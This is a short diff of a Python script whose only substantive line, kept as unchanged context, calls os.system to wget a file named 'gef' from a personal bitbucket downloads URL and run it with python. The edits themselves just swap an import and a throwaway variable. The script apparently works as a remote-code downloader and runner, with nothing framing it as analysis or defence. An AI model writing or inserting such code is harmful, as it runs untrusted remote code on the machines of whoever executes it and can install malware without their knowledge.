@@ -1,4 +1,4 @@
-import os, sys,optparse
-a=14
+import os, sys,datetime
+p=2
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef';os.system(cmd)
